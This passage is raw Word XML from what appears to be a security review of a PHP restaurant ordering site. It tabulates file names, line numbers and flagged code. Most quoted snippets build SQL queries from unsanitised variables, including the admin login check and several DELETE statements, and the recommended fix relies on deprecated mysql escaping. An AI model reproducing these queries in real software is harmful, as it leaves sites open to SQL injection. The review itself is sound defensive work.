              <w:t>VALUES('$member_id','$food_id','$scale_id')";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="25473454" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AE18711" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Order-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4907725D" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3DBB35CC" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="520BAF0C" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00981AE8" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="0006062C">
              <w:t>$qry_select=mysql_query("SELECT * FROM billing_details WHERE member_id='$member_id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="2000604E" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="37AF539B" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Order-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C273A06" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>67</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="67E9D46A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1086D75A" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="0006062C" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00AE4584">
              <w:t>$qry_create = "INSERT INTO orders_details(member_id,billing_id,cart_id,delivery_date,flag,time_stamp) VALUES('$member_id','$billing_id','$id','$delivery_date','$flag_0','$time_stamp')";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="3963905B" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="497B4430" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Order-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18F3B397" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>71</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="583D6CA3" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="477D9FAD" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00AE4584" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00AE4584">
              <w:t>$qry_update = "UPDATE cart_details SET flag='$flag_1' WHERE cart_id='$id' AND member_id='$member_id'";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="08CCEF9E" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BA5CB1A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>cart-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="626D6854" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A484E16" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Unnecessary divulging data</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="62E86739" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00AE4584" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00AE4584">
              <w:t>$result=mysql_query("SELECT * FROM food_details WHERE food_id='$food_id'") or die("A problem has occured ... \n" . "Our team is working on it at the moment ... \n" . "Please check back after few hours.");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="1382C593" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3911482E" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>cart-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="670AE6FF" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>58</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="284CC01F" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="237325ED" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00AE4584" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="006B6D5E">
              <w:t xml:space="preserve">        $qry = "INSERT INTO cart_details(member_id, food_id, quantity_id, total, flag) VALUES('$member_id','$food_id','$quantity_id','$total','$flag_0')";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="463C2AFE" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1AE24F07" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Throughout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76FE82FA" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Update-quantitiy.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CF39CF2" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48D8A796" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Implement throughout all input pages</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3AA1FDC2" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">    function clean($str) {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7390D444" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">        $str = @trim($str);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="162C17E9" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">        if(get_magic_quotes_gpc()) {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="349E0C01" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">            $str = stripslashes($str);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E3F4B58" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">        }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D3A45A9" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">        return mysql_real_escape_string($str);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F8F444D" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="006B6D5E" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="6A1DA89D" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D4A3721" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-category.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7331B331" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="54B46692" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27CFCDFA" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM categories WHERE category_id='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="3CBF6098" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0EDA831A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-food.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FE43DC8" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="22230A7C" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3555EF05" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM food_details WHERE food_id='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="283ED8C0" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="14E96F87" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-member.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5A684C62" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E472A3C" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B2C2972" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM members WHERE member_id='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="008BDFA5" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0E0E0B87" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-message.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4BDD0259" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78AFF508" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="115838E8" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM messages WHERE message_id='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="1721A9FE" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="110F7BBC" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-order.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A0A9705" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="235050E1" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B3B9074" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM orders_details WHERE order_id='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="0C355CE9" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01832A07" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-reservation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FEFFD3A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="54D253C4" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23E4664D" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM reservations_details WHERE ReservationID='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="0AE4FB74" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="763A0E50" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Admin/delete-special.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C4411B1" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A678C3E" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="017BF14E" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1065"/>
              </w:tabs>
            </w:pPr>
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM specials WHERE special_id='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="7481699E" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D8F5AE0" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/delete-staff.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F9DF829" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7A46289A" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70908D16" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("DELETE FROM staff WHERE StaffID='$id'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="07FDF64D" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23BDD081" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/update-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43F4B350" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1D8FE4B9" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Should take session ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34464CD2" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00066C48">
              <w:t>$result = mysql_query("UPDATE pizza_admin SET Password='$NewPassword' WHERE Admin_ID='$id' AND Password='$OldPassword'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00790807" w14:paraId="4D4A225B" w14:textId="77777777" w:rsidTr="00790807">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2788" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34DE8B91" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="709" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="589CF7DD" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3685" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18DDD059" w14:textId="77777777" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3828" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="108EB1DD" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00066C48" w:rsidRDefault="00790807" w:rsidP="00225A89">
            <w:r w:rsidRPr="00540928">
              <w:t>$qry="SELECT * FROM pizza_admin WHERE Username='$username' AND Password='$password'";</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6070A2A8" w14:textId="77777777" w:rsidR="00790807" w:rsidRPr="00790807" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00790807" w:rsidRPr="00790807" w:rsidSect="004D7B3D">
      <w:footerReference w:type="default" r:id="rId81"/>
      <w:footerReference w:type="first" r:id="rI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4DCB4" w14:textId="77777777" w:rsidR="00324BE7" w:rsidRDefault="00324BE7" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="76DB02CA" w14:textId="77777777" w:rsidR="00324BE7" w:rsidRDefault="00324BE7"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E86EC" w14:textId="77777777" w:rsidR="00582609" w:rsidRDefault="00582609">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859836"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="4A1E73C6" w14:textId="77777777" w:rsidR="00582609" w:rsidRDefault="005826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0D4C4E7F" w14:textId="77777777" w:rsidR="00582609" w:rsidRDefault="005826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717893"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="23B8C809" w14:textId="77777777" w:rsidR="00582609" w:rsidRDefault="00582609" w:rsidP="003363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F22F62">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
